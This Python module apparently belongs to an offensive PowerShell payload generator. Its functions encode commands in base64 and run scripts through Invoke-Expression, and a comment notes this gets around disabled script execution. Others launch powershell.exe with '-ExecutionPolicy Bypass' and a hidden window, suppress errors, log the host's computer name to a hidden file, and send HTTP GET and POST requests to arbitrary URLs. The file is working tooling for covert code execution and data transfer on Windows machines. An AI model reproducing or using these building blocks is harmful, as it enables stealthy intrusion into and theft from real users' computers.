import base64
from lib import utils


# return UTF-16 encoded BASE64 for powershell encoded command
def ps_base64(string):
    return base64.b64encode(string.encode('UTF-16LE')).decode("utf-8")


# invoke a script by using Invoke-Expression
# this is allowed in most cases even when direct script execution is disabled
def func_invoke_script(script_path):
    return "Invoke-Expression (Get-Content '%s' -Raw);" % script_path


# same as func_invoke_script but with base64 decoding
def func_invoke_script_base64(script_path):
    output = "$tmp=(Get-Content './%s' -Raw);" % script_path
    enc, var = func_b64decode("$tmp")
    output += enc
    output += "Invoke-Expression $%s;" % var
    return output


# checks hidden host file for current pc name
def func_write_pc(filename):
    return 'Write-Output "$env:computername" >> %s;' % filename


# function to encode text as base64 and return the output in the returned variable name
def func_b64encode(string):
    temp_var = utils.random_string(10)
    output = "$tmp=[System.Text.Encoding]::UTF8.GetBytes(%s);" % string
    output += "$%s=[System.Convert]::ToBase64String($tmp);" % temp_var
    return output, temp_var


# function to decode text from base64 and return the output in the returned variable name
def func_b64decode(string):
    temp_var = utils.random_string(10)
    output = "$%s=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(%s));" % (temp_var, string)
    return output, temp_var


# do a HTTP GET request and return response in the returned variable name
def func_http_get(url):
    temp_var = utils.random_string(10)
    output = "$%s=Invoke-WebRequest -Uri %s;" % (temp_var, url)
    return output, temp_var


# do a HTTP POST request and return response in the returned variable name
def func_http_post(url, body):
    temp_var = utils.random_string(10)
    output = "$%s=Invoke-WebRequest -Method Post -ContentType 'application/x-www-form-urlencoded' -Uri %s -Body %s;" % (temp_var, url, body)
    return output, temp_var


# method to call executables from within powershell
def call_exe(exe_name):
    return "./%s;" % exe_name


# disable the exception handler to continue running on error
def disable_exception_handler():
    return "$ErrorActionPreference = 'SilentlyContinue';"


# url encode string
def func_urlencode(arg_in, arg_out):
    return '$%s=[System.Net.WebUtility]::UrlEncode($%s);' % (arg_out, arg_in)


# generate powershell.exe + arguments for execution
def encoded_args(encoded_string, bypass=False, full_path=True, custom_path=None, hide_window=True):
    output = ""
    outf = ""
    if full_path:
        outf = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe "
    else:
        outf = "powershell.exe"
    if custom_path:
        outf = custom_path

    if bypass:
        output += "-ExecutionPolicy Bypass "

    if hide_window:
        output += "-w 1 "

    output += "-enc %s" % encoded_string
    return outf, output
